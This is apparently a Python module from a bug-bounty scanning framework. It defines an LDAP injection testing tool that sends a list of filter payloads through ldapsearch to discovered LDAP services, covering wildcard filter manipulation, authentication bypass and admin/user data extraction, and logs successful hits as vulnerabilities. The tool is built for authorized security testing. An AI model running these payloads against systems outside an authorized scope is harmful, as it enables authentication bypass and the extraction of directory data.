"""LdapInjectionTool -- Stage 3 LDAP filter injection testing."""

from __future__ import annotations

import asyncio
import time

from lib_webbh import get_session, setup_logger
from lib_webbh.scope import ScopeManager

from workers.network_worker.base_tool import NetworkTestTool
from workers.network_worker.concurrency import WeightClass

logger = setup_logger("ldap-injection-tool")

LDAP_TIMEOUT = 30
INJECTION_DELAY = 1.0  # seconds between payloads

# LDAP injection payloads — read-only, no write/delete operations
LDAP_PAYLOADS: list[dict] = [
    # Filter manipulation
    {
        "name": "wildcard_uid",
        "filter": "*)(uid=*",
        "category": "filter_manipulation",
        "description": "LDAP filter manipulation via wildcard UID injection",
    },
    {
        "name": "wildcard_cn",
        "filter": ")(cn=*",
        "category": "filter_manipulation",
        "description": "LDAP filter manipulation via wildcard CN injection",
    },
    {
        "name": "always_true",
        "filter": "*)(objectClass=*",
        "category": "filter_manipulation",
        "description": "LDAP filter bypass via always-true objectClass wildcard",
    },
    # Auth bypass
    {
        "name": "auth_bypass_and",
        "filter": "*)(&",
        "category": "auth_bypass",
        "description": "LDAP authentication bypass via AND operator injection",
    },
    {
        "name": "auth_bypass_or",
        "filter": "*)(|(&",
        "category": "auth_bypass",
        "description": "LDAP authentication bypass via OR operator injection",
    },
    {
        "name": "auth_bypass_null",
        "filter": "*)(%00",
        "category": "auth_bypass",
        "description": "LDAP authentication bypass via null byte injection",
    },
    # Data extraction
    {
        "name": "extract_all_users",
        "filter": "*)(uid=*))(|(uid=*",
        "category": "data_extraction",
        "description": "LDAP data extraction via nested filter for all UIDs",
    },
    {
        "name": "extract_admin",
        "filter": "admin*)(|(objectClass=*",
        "category": "data_extraction",
        "description": "LDAP data extraction targeting admin accounts",
    },
]


class LdapInjectionTool(NetworkTestTool):
    """LDAP filter injection testing against detected LDAP services."""

    name = "ldap_injection"
    weight_class = WeightClass.MEDIUM

    def classify_severity(self, category: str) -> str:
        """Map payload category to vulnerability severity."""
        if category == "auth_bypass":
            return "high"
        return "medium"

    def _build_ldapsearch_command(
        self,
        host: str,
        port: int,
        payload_filter: str,
    ) -> list[str]:
        """Build ldapsearch command to test injection."""
        return [
            "ldapsearch",
            "-x",
            "-H", f"ldap://{host}:{port}",
            "-b", "",
            "-s", "base",
            f"({payload_filter})",
            "-LLL",
            "-z", "1",
        ]

    def _is_successful_injection(
        self,
        stdout: str,
        elapsed: float,
        payload: dict,
    ) -> bool:
        """Determine if an injection attempt was successful."""
        stdout_lower = stdout.lower()

        if any(
            marker in stdout_lower
            for marker in ["dn:", "cn=", "uid=", "objectclass:"]
        ):
            return True

        if payload["category"] == "auth_bypass" and elapsed > 3.0:
            return True

        return False

    async def execute(
        self,
        target,
        scope_manager: ScopeManager,
        target_id: int,
        container_name: str,
        **kwargs,
    ) -> dict:
        log = logger.bind(target_id=target_id)

        if await self.check_cooldown(target_id, container_name):
            log.info("Skipping ldap_injection -- within cooldown")
            return {"found": 0, "in_scope": 0, "new": 0, "skipped_cooldown": True}

        stats = {"found": 0, "in_scope": 0, "new": 0}

        ldap_locations = await self._get_locations_by_service(
            target_id, ["ldap", "ldaps"]
        )
        if not ldap_locations:
            log.info("No LDAP services detected — skipping injection tests")
            return stats

        for loc in ldap_locations:
            host = await self._get_asset_ip(loc.asset_id)
            if not host:
                continue

            for payload in LDAP_PAYLOADS:
                cmd = self._build_ldapsearch_command(
                    host, loc.port, payload["filter"],
                )

                start = time.monotonic()
                try:
                    stdout = await self.run_subprocess(cmd, timeout=LDAP_TIMEOUT)
                except asyncio.TimeoutError:
                    continue
                except Exception:
                    continue
                elapsed = time.monotonic() - start

                if self._is_successful_injection(stdout, elapsed, payload):
                    stats["found"] += 1
                    stats["in_scope"] += 1
                    stats["new"] += 1

                    severity = self.classify_severity(payload["category"])
                    await self._save_vulnerability(
                        target_id=target_id,
                        asset_id=loc.asset_id,
                        severity=severity,
                        title=f"LDAP Injection — {payload['name']}",
                        description=payload["description"],
                        poc=(
                            f"Filter: ({payload['filter']})\n"
                            f"Host: {host}:{loc.port}\n"
                            f"Response: {stdout[:1000]}"
                        ),
                    )

                await asyncio.sleep(INJECTION_DELAY)

        await self.update_tool_state(target_id, container_name)
        log.info("ldap_injection complete", extra=stats)
        return stats
